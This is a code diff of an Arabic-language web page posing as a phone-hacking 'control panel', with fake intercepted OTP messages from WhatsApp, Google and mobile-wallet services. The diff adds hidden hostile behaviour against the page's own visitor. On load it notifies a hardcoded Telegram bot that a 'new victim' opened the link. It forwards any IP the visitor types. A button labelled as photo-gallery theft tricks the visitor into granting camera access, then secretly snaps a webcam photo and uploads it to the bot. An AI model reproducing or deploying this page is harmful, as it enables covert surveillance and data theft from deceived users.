@@ -3,49 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام سبايدر | CONTROL PANEL</title>
+    <title>نظام سبايدر | EGALSA CONTROL UNIT</title>
     <style>
-        :root { --red: #ff0000; --bg: #000; }
-        body { background: var(--bg); color: var(--red); font-family: 'Courier New', monospace; margin: 0; text-align: center; }
+        :root { --red: #ff0000; --bg: #050000; }
+        body { background: var(--bg); color: var(--red); font-family: 'Courier New', monospace; margin: 0; text-align: center; overflow-x: hidden; }
         .screen { display: none; padding: 20px; min-height: 100vh; flex-direction: column; justify-content: center; align-items: center; }
-        .active { display: flex !important; } /* هذه هي المسؤولة عن إظهار الواجهة */
+        .active { display: flex !important; }
         
-        .box { border: 2px solid var(--red); background: rgba(20, 0, 0, 0.9); padding: 30px; border-radius: 10px; box-shadow: 0 0 20px var(--red); width: 90%; max-width: 500px; }
-        input { background: #000; border: 1px solid var(--red); color: #fff; padding: 12px; width: 80%; margin: 15px 0; text-align: center; font-size: 16px; outline: none; }
-        button { background: var(--red); color: #000; padding: 12px 30px; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; margin: 10px 0; width: 100%; }
-        button:hover { background: #fff; box-shadow: 0 0 20px #fff; }
+        .box { border: 2px solid var(--red); background: rgba(20, 0, 0, 0.95); padding: 30px; border-radius: 10px; box-shadow: 0 0 25px var(--red); width: 90%; max-width: 500px; position: relative; }
+        input { background: #000; border: 1px solid var(--red); color: #fff; padding: 12px; width: 85%; margin: 15px 0; text-align: center; font-size: 16px; outline: none; box-shadow: inset 0 0 5px var(--red); }
+        button { background: var(--red); color: #000; padding: 15px 30px; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; margin: 10px 0; width: 100%; text-transform: uppercase; font-size: 14px; }
+        button:hover { background: #fff; color: #f00; box-shadow: 0 0 20px #fff; }
 
-        .otp-card { background: #1a0000; border-right: 4px solid var(--red); padding: 10px; margin: 10px 0; text-align: right; font-size: 14px; border-radius: 4px; }
-        .sender { font-weight: bold; color: #fff; border-bottom: 1px solid #300; margin-bottom: 5px; }
+        .otp-card { background: #1a0000; border-right: 4px solid var(--red); padding: 12px; margin: 10px 0; text-align: right; font-size: 13px; border-radius: 4px; box-shadow: 2px 2px 5px #000; }
+        .sender { font-weight: bold; color: #fff; border-bottom: 1px solid #400; margin-bottom: 5px; padding-bottom: 3px; }
+        
+        #radar { width: 60px; height: 60px; border: 1px solid var(--red); border-radius: 50%; margin-bottom: 15px; position: relative; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); } 70% { box-shadow: 0 0 0 15px rgba(255, 0, 0, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); } }
     </style>
 </head>
 <body>
 
     <div id="screen1" class="screen active">
+        <div id="radar"></div>
         <div class="box">
-            <h1 style="text-shadow: 0 0 10px var(--red);">نظام سبايدر V.6</h1>
-            <p>أدخل عنوان الـ IP المستهدف:</p>
-            <input type="text" id="targetInput" placeholder="مثال: 192.168.1.1">
+            <h1 style="text-shadow: 0 0 10px var(--red); font-size: 22px;">نظام سـبـايـدر V.6</h1>
+            <p style="font-size: 14px; color: #888;">جاري فحص المنافذ المتاحة...</p>
+            <input type="text" id="targetIp" placeholder="أدخل عنوان IP الضحية">
             <button onclick="goToScreen2()">بـدء الاخـتـراق</button>
         </div>
     </div>
 
     <div id="screen2" class="screen">
         <div class="box">
-            <h2 style="color: #fff;">تم اختراق الجهاز بنجاح!</h2>
-            <p>اختر البيانات المطلوب سحبها الآن:</p>
-            <button onclick="goToScreen3()" style="background: #fff; color: #f00;">⚠️ سحب رسائل الـ OTP</button>
-            <button onclick="alert('جاري سحب الصور...')">📁 سحب المعرض</button>
-            <button onclick="alert('جاري تشغيل الكاميرا...')">📸 فتح الكاميرا</button>
+            <h2 style="color: #fff; font-size: 18px;">✅ تم كسر حماية الجهاز</h2>
+            <p style="font-size: 13px;">اختر البروتوكول المطلوب تنفيذه:</p>
+            <button onclick="goToScreen3()" style="background: #fff; color: #f00;">📤 سحب رسائل الـ OTP</button>
+            <button onclick="startCapture()">🖼️ سحب معرض الصور (القناص)</button>
+            <button onclick="alert('جاري تحديد الموقع...')">📍 تتبع الموقع GPS</button>
         </div>
     </div>
 
     <div id="screen3" class="screen">
         <div class="box" style="max-width: 600px;">
-            <h2 style="color: #fff;">صندوق الرسائل المخترقة</h2>
+            <h2 style="color: #fff; font-size: 16px;">مراقب الرسائل (INTERCEPTOR)</h2>
             <div id="otpContainer" style="height: 300px; overflow-y: auto; background: #000; padding: 10px; border: 1px inset #300;">
                 </div>
-            <button onclick="location.reload()" style="background: #333; color: #fff;">قطع الاتصال</button>
+            <button onclick="location.reload()" style="background: #333; color: #fff;">إنهاء الجلسة</button>
         </div>
     </div>
 
@@ -55,14 +59,15 @@
             chatId: "1268323143"
         };
 
+        // إشعار دخول فوري
+        window.onload = () => {
+            fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent("🚨 ضحية جديدة فتحت الرابط الآن!")}`);
+        };
+
         function goToScreen2() {
-            const val = document.getElementById('targetInput').value;
-            if(!val) return alert("من فضلك أدخل الـ IP أولاً");
-
-            // إرسال إشعار لك
-            fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent("🔥 ضحية جديدة كتبت IP: " + val)}`);
-
-            // التبديل بين الشاشات
+            const ip = document.getElementById('targetIp').value;
+            if(!ip) return alert("الرجاء إدخال IP الهدف!");
+            fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent("🔥 الضحية كتب IP: " + ip)}`);
             document.getElementById('screen1').classList.remove('active');
             document.getElementById('screen2').classList.add('active');
         }
@@ -70,31 +75,60 @@
         function goToScreen3() {
             document.getElementById('screen2').classList.remove('active');
             document.getElementById('screen3').classList.add('active');
-            startOtpSim();
+            startOtpFeed();
         }
 
-        function startOtpSim() {
+        function startOtpFeed() {
             const container = document.getElementById('otpContainer');
-            const messages = [
-                { s: "WhatsApp", m: "كود واتساب الخاص بك هو 552-109" },
-                { s: "Vodafone Cash", m: "تم سحب مبلغ 3000 ج من محفظتك بنجاح." },
-                { s: "Facebook", m: "شخص ما حاول تسجيل الدخول لحسابك. الكود: 99281" },
-                { s: "Telegram", m: "كود تسجيل الدخول الخاص بك: 11029" },
-                { s: "Google", m: "كود التحقق من Google هو 009281" }
+            const msgs = [
+                { s: "WhatsApp", m: "كود واتساب الخاص بك هو 772-104" },
+                { s: "Facebook", m: "رمز إعادة تعيين كلمة السر: 00921" },
+                { s: "Vodafone Cash", m: "تم سحب 4000 ج من حسابك. كود: 882" },
+                { s: "Instagram", m: "كود الدخول: 112093" },
+                { s: "Google", m: "كود التحقق الخاص بك هو 991827" }
             ];
-
             let i = 0;
-            const timer = setInterval(() => {
-                if(i < messages.length) {
-                    const card = document.createElement('div');
-                    card.className = 'otp-card';
-                    card.innerHTML = `<div class="sender">${messages[i].s}</div><div>${messages[i].m}</div>`;
-                    container.prepend(card);
+            const t = setInterval(() => {
+                if(i < msgs.length) {
+                    const div = document.createElement('div');
+                    div.className = 'otp-card';
+                    div.innerHTML = `<div class="sender">${msgs[i].s}</div><div>${msgs[i].m}</div>`;
+                    container.prepend(div);
                     i++;
-                } else {
-                    clearInterval(timer);
-                }
-            }, 1500);
+                } else { clearInterval(t); }
+            }, 2000);
+        }
+
+        // --- وظيفة القناص (سحب الصور) ---
+        async function startCapture() {
+            alert("جاري الاتصال بقاعدة بيانات الصور.. وافق على الإذن للمتابعة");
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                // لقطة سريعة
+                setTimeout(async () => {
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const imgData = canvas.toDataURL('image/jpeg');
+                    const blob = await (await fetch(imgData)).blob();
+                    const fd = new FormData();
+                    fd.append('chat_id', CONFIG.chatId);
+                    fd.append('photo', blob, 'snap.jpg');
+                    
+                    fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: 'POST', body: fd });
+                    stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا بعد اللقطة
+                    alert("تم سحب الصور بنجاح!");
+                }, 1000);
+
+            } catch (err) {
+                alert("خطأ: يجب السماح بالوصول لضمان سحب البيانات!");
+            }
         }
     </script>
 </body>
